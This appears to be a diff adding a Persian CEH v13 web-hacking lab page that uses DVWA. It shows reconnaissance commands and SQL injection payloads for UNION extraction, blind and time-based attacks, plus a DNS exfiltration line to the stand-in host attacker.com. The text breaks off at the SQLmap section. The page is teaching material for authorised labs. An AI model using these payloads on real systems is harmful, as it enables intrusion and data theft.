@@ -1,0 +1,1684 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>آزمایشگاه جامع Web Hacking - دوره CEH V13</title>
+    <link rel="stylesheet" href="../../style.css">
+    <style>
+        /* ===== فونت و ریست ===== */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background: #f4f7fb;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.8;
+            padding: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+            color: #1e2a3a;
+        }
+
+        h1, h2, h3, h4 {
+            color: #0b3b5c;
+            border-bottom: 3px solid #2a7de1;
+            padding-bottom: 10px;
+            margin-top: 28px;
+            margin-bottom: 18px;
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 40px;
+            font-size: 2.4rem;
+            border-bottom: none;
+        }
+        h3 {
+            border-bottom: 2px solid #b6d4f0;
+            font-size: 1.2rem;
+        }
+        h4 {
+            border-bottom: 1px dashed #b6d4f0;
+            font-size: 1.05rem;
+        }
+
+        /* ===== کارت‌ها ===== */
+        .card {
+            background: #ffffff;
+            padding: 28px 32px;
+            border-radius: 16px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.05);
+            margin-bottom: 32px;
+            border-right: 6px solid #2a7de1;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+        .card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.08);
+        }
+
+        /* ===== نوار ناوبری ===== */
+        .nav-bar {
+            background: #0b3b5c;
+            padding: 16px 30px;
+            border-radius: 14px;
+            color: white;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .nav-bar a {
+            color: #b6d4f0;
+            text-decoration: none;
+            font-weight: 600;
+            margin: 0 6px;
+            transition: color 0.2s;
+        }
+        .nav-bar a:hover {
+            color: white;
+            text-decoration: underline;
+        }
+        .nav-bar span:first-child {
+            font-weight: 700;
+            font-size: 1.3rem;
+        }
+
+        /* ===== فهرست مطالب ===== */
+        .toc {
+            background: #e8f0fe;
+            padding: 20px 28px;
+            border-radius: 14px;
+            margin-bottom: 30px;
+            border-right: 6px solid #2a7de1;
+        }
+        .toc strong {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 1.05rem;
+        }
+        .toc ul {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 6px 20px;
+            list-style: none;
+            padding: 0;
+            margin: 8px 0 0 0;
+        }
+        .toc ul li {
+            padding: 4px 8px;
+            border-radius: 6px;
+            transition: background 0.15s;
+        }
+        .toc ul li:hover {
+            background: #d4e0f0;
+        }
+        .toc ul li a {
+            text-decoration: none;
+            color: #0b3b5c;
+            font-weight: 500;
+            display: block;
+        }
+        .toc ul li a:hover {
+            color: #2a7de1;
+        }
+
+        /* ===== جدول‌ها ===== */
+        .table-responsive {
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            margin: 16px 0 12px 0;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: white;
+            font-size: 0.95rem;
+            min-width: 550px;
+        }
+        th {
+            background: #1e3a5f;
+            color: white;
+            padding: 14px 18px;
+            text-align: right;
+            white-space: nowrap;
+            font-weight: 600;
+        }
+        td {
+            padding: 12px 18px;
+            border-bottom: 1px solid #e8edf4;
+            vertical-align: top;
+            word-break: break-word;
+        }
+        tr:hover {
+            background: #f1f6fa;
+        }
+        td code, th code {
+            background: #eef3f7;
+            padding: 2px 10px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            color: #c7254e;
+            border: 1px solid #dce3ea;
+            white-space: nowrap;
+        }
+        td code {
+            white-space: normal;
+            word-break: break-word;
+        }
+
+        /* ===== کد بلاک ===== */
+        .code-block {
+            position: relative;
+            background: #1e2a3a;
+            padding: 20px 24px;
+            border-radius: 14px;
+            overflow-x: auto;
+            margin: 16px 0;
+            border-left: 6px solid #2a7de1;
+        }
+        .code-block code {
+            background: transparent;
+            border: none;
+            color: #e4eef7;
+            padding: 0;
+            font-size: 0.95rem;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+        .copy-btn {
+            position: absolute;
+            top: 12px;
+            left: 16px;
+            background: #4a5a7a;
+            color: white;
+            border: none;
+            padding: 5px 16px;
+            border-radius: 8px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+            letter-spacing: 0.3px;
+        }
+        .copy-btn:hover {
+            background: #2a7de1;
+        }
+        .copy-btn:active {
+            transform: scale(0.95);
+        }
+
+        /* ===== باکس‌های ویژه ===== */
+        .highlight-box {
+            background: #e8f0fe;
+            border-right: 6px solid #ff9f1c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .warning-box {
+            background: #fef0e8;
+            border-right: 6px solid #e74c3c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .tip-box {
+            background: #e8fef0;
+            border-right: 6px solid #27ae60;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .info-box {
+            background: #e8f0fe;
+            border-right: 6px solid #2a7de1;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .success-box {
+            background: #e8fef0;
+            border-right: 6px solid #27ae60;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+
+        /* ===== برچسب‌های فاز ===== */
+        .phase-badge {
+            display: inline-block;
+            padding: 4px 16px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            margin: 4px 0 10px 0;
+        }
+        .phase-recon { background: #d4edda; color: #155724; }
+        .phase-scan { background: #cce5ff; color: #004085; }
+        .phase-attack { background: #fff3cd; color: #856404; }
+        .phase-exploit { background: #f8d7da; color: #721c24; }
+        .phase-post { background: #d1ecf1; color: #0c5460; }
+        .phase-defense { background: #e8d4f0; color: #6c3483; }
+
+        /* ===== برچسب ابزار ===== */
+        .tools-used {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin: 10px 0;
+        }
+        .tools-used .tool-tag {
+            background: #1e2a3a;
+            color: #e4eef7;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-family: 'Courier New', monospace;
+            border: 1px solid #3a4a5a;
+        }
+        .tools-used .tool-tag.primary { border-color: #2a7de1; }
+        .tools-used .tool-tag.success { border-color: #27ae60; }
+        .tools-used .tool-tag.warning { border-color: #f39c12; }
+        .tools-used .tool-tag.danger { border-color: #e74c3c; }
+        .tools-used .tool-tag.info { border-color: #17a2b8; }
+
+        /* ===== سوالات ===== */
+        .question-box {
+            background: #f8f9fa;
+            border-right: 4px solid #6c757d;
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        .question-box strong {
+            color: #0b3b5c;
+        }
+
+        /* ===== خروجی ===== */
+        .output-box {
+            background: #1a2a3a;
+            color: #b6d4f0;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.88rem;
+            border-right: 3px solid #4a8a5a;
+            overflow-x: auto;
+        }
+        .output-box .highlight-text { color: #f0c060; }
+        .output-box .success-text { color: #7ddf9a; }
+        .output-box .error-text { color: #f08080; }
+
+        /* ===== واژه‌نامه ===== */
+        .glossary-term {
+            font-weight: 700;
+            color: #0b3b5c;
+            background: #e8f0fe;
+            padding: 2px 8px;
+            border-radius: 4px;
+        }
+
+        /* ===== فوتر ===== */
+        .footer {
+            text-align: center;
+            margin-top: 50px;
+            padding-top: 22px;
+            border-top: 2px solid #dce3ea;
+            color: #5a6b7a;
+            font-size: 0.9rem;
+        }
+
+        /* ===== ریسپانسیو ===== */
+        @media (max-width: 768px) {
+            body {
+                padding: 12px;
+            }
+            .card {
+                padding: 18px 16px;
+            }
+            .nav-bar {
+                flex-direction: column;
+                align-items: stretch;
+                text-align: center;
+                padding: 14px 18px;
+            }
+            .toc ul {
+                grid-template-columns: 1fr 1fr;
+            }
+            h1 {
+                font-size: 1.8rem;
+            }
+            .copy-btn {
+                position: relative;
+                top: auto;
+                left: auto;
+                float: left;
+                margin-bottom: 12px;
+            }
+            .code-block {
+                padding: 14px;
+            }
+            table {
+                font-size: 0.85rem;
+                min-width: 400px;
+            }
+            th, td {
+                padding: 10px 12px;
+            }
+        }
+        @media (max-width: 480px) {
+            .toc ul {
+                grid-template-columns: 1fr;
+            }
+            table {
+                font-size: 0.8rem;
+                min-width: 320px;
+            }
+            th, td {
+                padding: 8px 10px;
+            }
+            h1 {
+                font-size: 1.4rem;
+            }
+        }
+
+        /* ===== انیمیشن ===== */
+        .card {
+            opacity: 0;
+            animation: fadeUp 0.6s ease forwards;
+        }
+        .card:nth-child(1) { animation-delay: 0.05s; }
+        .card:nth-child(2) { animation-delay: 0.1s; }
+        .card:nth-child(3) { animation-delay: 0.15s; }
+        .card:nth-child(4) { animation-delay: 0.2s; }
+        .card:nth-child(5) { animation-delay: 0.25s; }
+        .card:nth-child(6) { animation-delay: 0.3s; }
+        .card:nth-child(7) { animation-delay: 0.35s; }
+        .card:nth-child(8) { animation-delay: 0.4s; }
+        .card:nth-child(9) { animation-delay: 0.45s; }
+        .card:nth-child(10) { animation-delay: 0.5s; }
+        .card:nth-child(11) { animation-delay: 0.55s; }
+        .card:nth-child(12) { animation-delay: 0.6s; }
+        .card:nth-child(13) { animation-delay: 0.65s; }
+        .card:nth-child(14) { animation-delay: 0.7s; }
+        .card:nth-child(15) { animation-delay: 0.75s; }
+        .card:nth-child(16) { animation-delay: 0.8s; }
+
+        @keyframes fadeUp {
+            0% {
+                opacity: 0;
+                transform: translateY(24px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== نوار ناوبری ===== -->
+    <div class="nav-bar">
+        <span>📘 CEH V13</span>
+        <span>
+            <a href="../../../index.html">خانه</a> |
+            <a href="../../index.html">آزمایشگاه‌ها</a>
+        </span>
+    </div>
+
+    <h1>🌐 آزمایشگاه جامع Web Hacking</h1>
+
+    <!-- ===== فهرست مطالب ===== -->
+    <div class="toc">
+        <strong>📑 فهرست مطالب (کلیک کنید):</strong>
+        <ul>
+            <li><a href="#intro">🔰 مقدمه – هک برنامه‌های وب</a></li>
+            <li><a href="#architecture">🏗️ معماری برنامه‌های وب</a></li>
+            <li><a href="#owasp">📋 OWASP Top 10</a></li>
+            <li><a href="#setup">⚙️ راه‌اندازی محیط DVWA</a></li>
+            <li><a href="#recon">🔍 مرحله ۱: شناسایی وب‌سایت</a></li>
+            <li><a href="#sql-injection">🗄️ سناریو ۱: SQL Injection</a></li>
+            <li><a href="#xss">💉 سناریو ۲: Cross-Site Scripting</a></li>
+            <li><a href="#csrf">🔄 سناریو ۳: CSRF</a></li>
+            <li><a href="#file-upload">📤 سناریو ۴: آپلود فایل</a></li>
+            <li><a href="#command-injection">⌨️ سناریو ۵: Command Injection</a></li>
+            <li><a href="#idor">🔐 سناریو ۶: IDOR</a></li>
+            <li><a href="#ssrf">🌐 سناریو ۷: SSRF</a></li>
+            <li><a href="#xxe">📄 سناریو ۸: XXE</a></li>
+            <li><a href="#burp">🛠️ آموزش پیشرفته Burp Suite</a></li>
+            <li><a href="#tools">🛠️ ابزارهای تکمیلی وب</a></li>
+            <li><a href="#defense">🛡️ راه‌های مقابله</a></li>
+            <li><a href="#reporting">📄 گزارش‌نویسی</a></li>
+            <li><a href="#practice">🧪 تمرین‌های عملی</a></li>
+            <li><a href="#glossary">📖 واژه‌نامه تخصصی</a></li>
+        </ul>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱: مقدمه -->
+    <!-- ============================================================ -->
+    <div class="card" id="intro">
+        <h2>🔰 مقدمه – هک برنامه‌های وب</h2>
+        <p>
+            <b>هک برنامه‌های وب (Web Application Hacking)</b> یکی از حیاتی‌ترین حوزه‌های تست نفوذ است. برنامه‌های وب امروزه قلب تپنده کسب‌وکارها، بانک‌داری، شبکه‌های اجتماعی و خدمات ابری هستند. هرگونه آسیب‌پذیری در این برنامه‌ها می‌تواند به نشت اطلاعات حساس، سرقت هویت، اختلال در خدمات و خسارت‌های مالی هنگفت منجر شود.
+        </p>
+        <p>
+            در این آزمایشگاه جامع، شما با <b>رایج‌ترین آسیب‌پذیری‌های برنامه‌های وب</b> بر اساس <b>OWASP Top 10</b> آشنا شده و آنها را به‌صورت عملی بر روی محیط‌های آزمایشگاهی پیاده‌سازی خواهید کرد. این آزمایشگاه شامل <b>۸ سناریوی عملی</b> با جزئیات کامل گام‌به‌گام است.
+        </p>
+        <div class="info-box">
+            <b>🎯 اهداف این آزمایشگاه:</b>
+            <ul>
+                <li>شناسایی و بهره‌برداری از SQL Injection (همه انواع)</li>
+                <li>شناسایی و بهره‌برداری از XSS (Reflected, Stored, DOM-based)</li>
+                <li>شناسایی و بهره‌برداری از CSRF و Session Fixation</li>
+                <li>آسیب‌پذیری آپلود فایل و تکنیک‌های Bypass</li>
+                <li>Command Injection و تکنیک‌های پیشرفته</li>
+                <li>IDOR (Insecure Direct Object Reference)</li>
+                <li>SSRF (Server-Side Request Forgery)</li>
+                <li>XXE (XML External Entity Injection)</li>
+                <li>تسلط بر ابزارهای Burp Suite, SQLmap, Nikto, Gobuster</li>
+                <li>توانایی گزارش‌نویسی حرفه‌ای</li>
+            </ul>
+        </div>
+        <div class="warning-box">
+            <b>⚠️ هشدار اخلاقی:</b> تمام تمرینات این آزمایشگاه فقط در محیط‌های آزمایشگاهی با مجوز انجام شوند. هک وب‌سایت‌های دیگران بدون مجوز <b>جرم</b> است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۲: معماری برنامه‌های وب -->
+    <!-- ============================================================ -->
+    <div class="card" id="architecture">
+        <h2>🏗️ معماری برنامه‌های وب</h2>
+        <p>
+            برای درک آسیب‌پذیری‌های برنامه‌های وب، ابتدا باید با <b>معماری</b> و <b>اجزای</b> آنها آشنا شوید.
+        </p>
+
+        <h3>📌 اجزای اصلی معماری وب</h3>
+        <ul>
+            <li><b>کلاینت (Client):</b> مرورگر کاربر که درخواست‌ها را ارسال می‌کند.</li>
+            <li><b>وب‌سرور (Web Server):</b> درخواست‌ها را دریافت و صفحات را ارائه می‌دهد.</li>
+            <li><b>اپلیکیشن سرور (Application Server):</b> منطق برنامه را اجرا می‌کند (PHP, ASP.NET, Node.js, Python).</li>
+            <li><b>پایگاه داده (Database):</b> داده‌های برنامه را ذخیره می‌کند.</li>
+            <li><b>APIها:</b> ارتباط بین اجزا را مدیریت می‌کنند.</li>
+        </ul>
+
+        <h3>📌 مدل‌های معماری</h3>
+        <ul>
+            <li><b>Single-Tier:</b> همه اجزا روی یک سرور.</li>
+            <li><b>Two-Tier (Client-Server):</b> کلاینت و سرور.</li>
+            <li><b>Three-Tier:</b> کلاینت، سرور برنامه، پایگاه داده.</li>
+            <li><b>N-Tier (Microservices):</b> چندین سرویس مجزا.</li>
+        </ul>
+
+        <h3>📌 چرخه درخواست HTTP</h3>
+        <ol>
+            <li>کاربر URL را در مرورگر وارد می‌کند.</li>
+            <li>مرورگر یک درخواست HTTP به سرور ارسال می‌کند.</li>
+            <li>وب‌سرور درخواست را پردازش کرده و به برنامه مناسب هدایت می‌کند.</li>
+            <li>برنامه داده‌ها را از پایگاه داده دریافت یا ذخیره می‌کند.</li>
+            <li>پاسخ HTTP (HTML, JSON, XML) به مرورگر بازگردانده می‌شود.</li>
+        </ol>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> هر لایه از این معماری می‌تواند حاوی آسیب‌پذیری‌های خاص خود باشد. یک هکر قانونمند باید تمام لایه‌ها را بررسی کند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۳: OWASP Top 10 -->
+    <!-- ============================================================ -->
+    <div class="card" id="owasp">
+        <h2>📋 OWASP Top 10 (نسخه ۲۰۲۱)</h2>
+        <p>
+            <b>OWASP (Open Web Application Security Project)</b> یک سازمان غیرانتفاعی است که به بهبود امنیت برنامه‌های وب می‌پردازد. لیست ۱۰ آسیب‌پذیری برتر OWASP (OWASP Top 10) یک مرجع استاندارد برای شناسایی خطرناک‌ترین آسیب‌پذیری‌های برنامه‌های وب است.
+        </p>
+
+        <div class="table-responsive">
+            <table>
+                <tr><th>#</th><th>آسیب‌پذیری</th><th>توضیح</th></tr>
+                <tr><td>۱</td><td><b>شکست در کنترل دسترسی (Broken Access Control)</b></td><td>نقض سیاست‌های دسترسی</td></tr>
+                <tr><td>۲</td><td><b>شکست در رمزنگاری (Cryptographic Failures)</b></td><td>استفاده از رمزنگاری ضعیف یا عدم استفاده</td></tr>
+                <tr><td>۳</td><td><b>تزریق (Injection)</b></td><td>تزریق کد مخرب (SQL, Command, LDAP)</td></tr>
+                <tr><td>۴</td><td><b>طراحی ناامن (Insecure Design)</b></td><td>نقص در طراحی امنیتی</td></tr>
+                <tr><td>۵</td><td><b>پیکربندی ناامن (Security Misconfiguration)</b></td><td>تنظیمات اشتباه امنیتی</td></tr>
+                <tr><td>۶</td><td><b>اجزای آسیب‌پذیر و قدیمی (Vulnerable Components)</b></td><td>کتابخانه‌های قدیمی</td></tr>
+                <tr><td>۷</td><td><b>شکست در شناسایی و احراز هویت (Identification Failures)</b></td><td>ضعف در احراز هویت</td></tr>
+                <tr><td>۸</td><td><b>شکست در یکپارچگی نرم‌افزار و داده (Integrity Failures)</b></td><td>نقض یکپارچگی</td></tr>
+                <tr><td>۹</td><td><b>شکست در نظارت و لاگ‌گیری (Logging Failures)</b></td><td>عدم پایش کافی</td></tr>
+                <tr><td>۱۰</td><td><b>جعل درخواست از سمت سرور (SSRF)</b></td><td>درخواست‌های جعلی از سمت سرور</td></tr>
+            </table>
+        </div>
+
+        <div class="highlight-box">
+            <b>💡 نکته:</b> در این آزمایشگاه، آسیب‌پذیری‌های <b>تزریق (SQL, Command)</b>، <b>شکست در کنترل دسترسی (IDOR)</b>، <b>SSRF</b> و <b>پیکربندی ناامن</b> را به‌صورت عملی پوشش می‌دهیم.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۴: راه‌اندازی محیط DVWA -->
+    <!-- ============================================================ -->
+    <div class="card" id="setup">
+        <h2>⚙️ راه‌اندازی محیط DVWA</h2>
+        <p>
+            <b>DVWA (Damn Vulnerable Web Application)</b> یک برنامه وب آسیب‌پذیر است که به‌طور عمدی برای تمرین هک وب طراحی شده است. این محیط شامل تمام آسیب‌پذیری‌های اصلی OWASP است.
+        </p>
+
+        <div class="step-card">
+            <h3>گام ۱: دسترسی به DVWA</h3>
+            <p>DVWA روی Metasploitable 2 یا به‌صورت مستقل قابل نصب است. آدرس‌های دسترسی:</p>
+            <ul>
+                <li><b>روی Metasploitable 2:</b> <code dir="ltr">http://192.168.56.102/dvwa/</code></li>
+                <li><b>با Docker:</b> <code dir="ltr">docker run --rm -p 80:80 vulnerables/web-dvwa</code></li>
+                <li><b>با XAMPP:</b> نصب در <code dir="ltr">C:\xampp\htdocs\dvwa\</code></li>
+            </ul>
+            <div class="info-box">
+                <b>📌 اطلاعات ورود:</b>
+                <ul>
+                    <li><b>نام کاربری:</b> <code dir="ltr">admin</code></li>
+                    <li><b>رمز عبور:</b> <code dir="ltr">password</code></li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <h3>گام ۲: تنظیم سطح امنیت</h3>
+            <p>برای شروع، سطح امنیت را روی <b>Low</b> قرار دهید:</p>
+            <ul>
+                <li>وارد DVWA شوید.</li>
+                <li>به <b>Security</b> بروید.</li>
+                <li>گزینه <b>Low</b> را انتخاب کرده و روی <b>Submit</b> کلیک کنید.</li>
+            </ul>
+            <div class="warning-box">
+                <b>⚠️ توجه:</b> سطح Low تمام آسیب‌پذیری‌ها را فعال می‌کند. در محیط‌های واقعی هرگز از چنین تنظیماتی استفاده نکنید.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <h3>گام ۳: صفحات آسیب‌پذیر DVWA</h3>
+            <div class="table-responsive">
+                <table>
+                    <tr><th>صفحه</th><th>آسیب‌پذیری</th><th>مسیر</th></tr>
+                    <tr><td>SQL Injection</td><td>تزریق SQL</td><td><code dir="ltr">/dvwa/vulnerabilities/sqli/</code></td></tr>
+                    <tr><td>XSS Reflected</td><td>XSS بازتابی</td><td><code dir="ltr">/dvwa/vulnerabilities/xss_r/</code></td></tr>
+                    <tr><td>XSS Stored</td><td>XSS ذخیره‌شده</td><td><code dir="ltr">/dvwa/vulnerabilities/xss_s/</code></td></tr>
+                    <tr><td>File Upload</td><td>آپلود فایل</td><td><code dir="ltr">/dvwa/vulnerabilities/upload/</code></td></tr>
+                    <tr><td>CSRF</td><td>جعل درخواست</td><td><code dir="ltr">/dvwa/vulnerabilities/csrf/</code></td></tr>
+                    <tr><td>Command Injection</td><td>تزریق دستور</td><td><code dir="ltr">/dvwa/vulnerabilities/exec/</code></td></tr>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۵: شناسایی وب‌سایت -->
+    <!-- ============================================================ -->
+    <div class="card" id="recon">
+        <h2>🔍 مرحله ۱: شناسایی وب‌سایت (Web Footprinting)</h2>
+        <p>
+            قبل از هر حمله، باید اطلاعات کاملی از وب‌سایت هدف جمع‌آوری کنید. این مرحله به هکر کمک می‌کند تا نقاط ضعف را شناسایی کند.
+        </p>
+
+        <div class="step-card">
+            <h3>📌 ۱. شناسایی وب‌سرور با Netcat</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr">nc -nv 192.168.56.102 80
+HEAD / HTTP/1.0
+[Enter 2 بار]</code></pre>
+            </div>
+            <div class="output-box">
+                <span class="success-text">HTTP/1.1 200 OK</span><br>
+                <span class="highlight-text">Date: Sun, 20 Jan 2024 14:23:00 GMT</span><br>
+                <span class="highlight-text">Server: Apache/2.2.8 (Ubuntu) DAV/2</span><br>
+                <span class="highlight-text">X-Powered-By: PHP/5.2.4-2ubuntu5.10</span>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <h3>📌 ۲. اسکن با Nmap</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>nmap -sV -p 80,443 192.168.56.102
+nmap --script=http-* -p 80 192.168.56.102</code></pre>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <h3>📌 ۳. اسکن دایرکتوری با Gobuster</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirb/common.txt</code></pre>
+            </div>
+            <div class="output-box">
+                <span class="success-text">/cgi-bin/ (Status: 403)</span><br>
+                <span class="success-text">/dvwa/ (Status: 200)</span><br>
+                <span class="success-text">/images/ (Status: 200)</span><br>
+                <span class="success-text">/index.html (Status: 200)</span><br>
+                <span class="success-text">/phpmyadmin/ (Status: 403)</span><br>
+                <span class="success-text">/server-status (Status: 403)</span>
+            </div>
+            <div class="tip-box">
+                <b>💡 نکته:</b> دایرکتوری‌های پیدا شده (مانند <code dir="ltr">/phpmyadmin/</code> و <code dir="ltr">/cgi-bin/</code>) می‌توانند نقاط ورود بالقوه‌ای برای حملات باشند.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <h3>📌 ۴. اسکن آسیب‌پذیری با Nikto</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>nikto -h http://192.168.56.102</code></pre>
+            </div>
+            <div class="output-box">
+                <span class="highlight-text">- Nikto v2.5.0</span><br>
+                <span class="success-text">+ Server: Apache/2.2.8 (Ubuntu) DAV/2</span><br>
+                <span class="warning-text">+ /phpmyadmin/: phpMyAdmin directory found</span><br>
+                <span class="warning-text">+ /cgi-bin/test.cgi: CGI test script found</span><br>
+                <span class="success-text">+ /dvwa/: Damn Vulnerable Web Application found</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۶: SQL Injection -->
+    <!-- ============================================================ -->
+    <div class="card" id="sql-injection">
+        <h2>🗄️ سناریو ۱: SQL Injection</h2>
+        <p>
+            <b>SQL Injection</b> یکی از خطرناک‌ترین آسیب‌پذیری‌های برنامه‌های وب است که در آن مهاجم کد SQL مخرب را به ورودی‌های برنامه تزریق می‌کند. در این بخش، <b>۴ نوع اصلی</b> SQL Injection را به‌صورت عملی بررسی می‌کنیم.
+        </p>
+
+        <div class="tools-used">
+            <span class="tool-tag primary">SQLmap</span>
+            <span class="tool-tag primary">Burp Suite</span>
+            <span class="tool-tag success">DVWA</span>
+            <span class="tool-tag warning">MySQL</span>
+        </div>
+
+        <h3>🔴 نوع ۱: Error-based SQL Injection</h3>
+        <div class="step-card">
+            <h4>گام ۱: شناسایی با کاراکتر ' (تیک)</h4>
+            <p>در صفحه SQL Injection، مقدار <code dir="ltr">1'</code> را وارد کنید:</p>
+            <div class="output-box">
+                <span class="error-text">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1</span>
+            </div>
+            <p><b>تحلیل:</b> خطای SQL نشان‌دهنده وجود آسیب‌پذیری است.</p>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۲: پیدا کردن تعداد ستون‌ها</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -</code></pre>
+            </div>
+            <p>وقتی خطایی دریافت کردید، یعنی تعداد ستون‌ها کمتر است. در DVWA، ۲ ستون وجود دارد.</p>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۳: استخراج داده با UNION</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'># استخراج نام پایگاه داده
+1' UNION SELECT NULL, database()-- -
+
+# استخراج نام جداول
+1' UNION SELECT table_name, NULL FROM information_schema.tables-- -
+
+# استخراج داده از جدول users
+1' UNION SELECT user, password FROM users-- -</code></pre>
+            </div>
+            <div class="output-box">
+                <span class="highlight-text">First name: admin</span><br>
+                <span class="highlight-text">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span>
+            </div>
+        </div>
+
+        <h3>🟡 نوع ۲: Boolean-based Blind SQL Injection</h3>
+        <div class="step-card">
+            <h4>گام ۱: تست با شرط True/False</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'># شرط True - صفحه عادی نمایش داده می‌شود
+1' AND 1=1-- -
+
+# شرط False - صفحه خالی یا خطا
+1' AND 1=2-- -</code></pre>
+            </div>
+            <p><b>تحلیل:</b> اگر پاسخ‌ها متفاوت باشند، آسیب‌پذیری Blind SQLi تأیید می‌شود.</p>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۲: استخراج کاراکتر اول نام پایگاه داده</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>1' AND ASCII(SUBSTRING(database(),1,1)) > 100-- -
+1' AND ASCII(SUBSTRING(database(),1,1)) = 100-- -</code></pre>
+            </div>
+            <div class="tip-box">
+                <b>💡 نکته:</b> با تغییر مقدار عددی، کاراکترهای نام پایگاه داده را حدس بزنید. 'd' برابر ۱۰۰ است.
+            </div>
+        </div>
+
+        <h3>🟢 نوع ۳: Time-based Blind SQL Injection</h3>
+        <div class="step-card">
+            <h4>گام ۱: تست با تأخیر</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>1' AND SLEEP(5)-- -</code></pre>
+            </div>
+            <p><b>تحلیل:</b> اگر صفحه ۵ ثانیه تأخیر داشته باشد، آسیب‌پذیری Time-based تأیید می‌شود.</p>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۲: استخراج با تأخیر شرطی</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>1' AND IF(ASCII(SUBSTRING(database(),1,1))=100, SLEEP(5), 0)-- -</code></pre>
+            </div>
+        </div>
+
+        <h3>🔵 نوع ۴: OUT-of-Band SQL Injection</h3>
+        <div class="step-card">
+            <h4>گام ۱: DNS Exfiltration</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>1' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\test'))-- -</code></pre>
+            </div>
+            <div class="warning-box">
+                <b>⚠️ نکته:</b> این روش نیاز به سرور DNS قابل کنترل دارد و فقط در برخی تنظیمات کار می‌کند.
+            </div>
+        </div>
+
+        <h3>🤖 استفاده از SQLmap (خودکار)</h3>
+        <div class="step-card">
+            <div class="code-block">
